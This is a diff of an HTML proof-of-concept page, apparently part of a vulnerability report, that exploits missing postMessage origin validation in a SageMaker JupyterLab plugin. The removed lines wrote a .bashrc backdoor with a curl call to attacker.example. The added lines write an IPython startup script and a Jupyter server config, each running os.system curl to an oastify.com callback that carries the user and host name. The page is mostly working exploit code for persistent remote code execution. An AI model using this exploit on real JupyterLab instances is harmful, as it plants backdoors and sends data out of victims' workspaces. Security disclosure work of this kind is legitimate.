@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Finding 4 — postMessage .bashrc Write PoC</title>
+  <title>Finding 4 — postMessage RCE PoC</title>
   <style>
     body { font-family: monospace; background: #0a0a0a; color: #c0c0c0; padding: 30px; }
     h1 { color: #ff4444; font-size: 18px; }
@@ -15,8 +15,8 @@
   </style>
 </head>
 <body>
-  <h1>CVE PoC: postMessage .bashrc Backdoor (Finding 4)</h1>
-  <p style="color:#666;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation → RCE via .bashrc</p>
+  <h1>CVE PoC: postMessage → RCE (Finding 4)</h1>
+  <p style="color:#666;font-size:12px">@amzn/sagemaker-ui-doc-manager-jl-plugin — missing origin validation → IPython startup + Jupyter config backdoor</p>
 
   <label>Target JupyterLab URL:</label>
   <input id="url" value="https://XXXXX.studio.us-east-2.sagemaker.aws/jupyterlab/default/lab" />
@@ -27,6 +27,8 @@
   <div id="status"></div>
 
 <script>
+var CALLBACK = '2nqdaq56ymdtf45fbkjtbga9w02rqje8.oastify.com';
+
 function status(msg, cls) {
   document.getElementById('status').innerHTML += '<div class="' + (cls||'') + '">' + msg + '</div>';
 }
@@ -42,16 +44,34 @@ function exploit() {
   setTimeout(function() {
     if (w.closed) { status('Popup was closed.', 'err'); return; }
 
+    // Attack 1: IPython startup script — auto-executes on every kernel start
     w.postMessage({
       type: 'sagemaker:nbevent:OpenOrCreateFile',
       payload: {
         type: 'file',
-        path: '.bashrc',
-        content: '# Backdoored via cross-origin postMessage (no origin validation)\ncurl https://attacker.example/exfil?user=$(whoami)\\&host=$(hostname)',
+        path: '.ipython/profile_default/startup/00-backdoor.py',
+        content: 'import os; os.system("curl https://' + CALLBACK + '/ipython-startup?user=$(whoami)\\&host=$(hostname)")',
         format: 'text'
       }
     }, '*');
-    status('Wrote .bashrc — RCE triggers on next terminal open.', 'ok');
+    status('[1/2] Wrote .ipython/profile_default/startup/00-backdoor.py', 'ok');
+    status('       → Executes every time a Jupyter kernel starts', 'ok');
+
+    // Attack 2: Jupyter server config — executes on server restart
+    setTimeout(function() {
+      w.postMessage({
+        type: 'sagemaker:nbevent:OpenOrCreateFile',
+        payload: {
+          type: 'file',
+          path: '.jupyter/jupyter_server_config.py',
+          content: 'import os; os.system("curl https://' + CALLBACK + '/jupyter-config?user=$(whoami)\\&host=$(hostname)")',
+          format: 'text'
+        }
+      }, '*');
+      status('[2/2] Wrote .jupyter/jupyter_server_config.py', 'ok');
+      status('       → Executes on Jupyter server restart', 'ok');
+      status('Check Burp Collaborator for callbacks.', 'warn');
+    }, 500);
   }, wait);
 }
 </script>
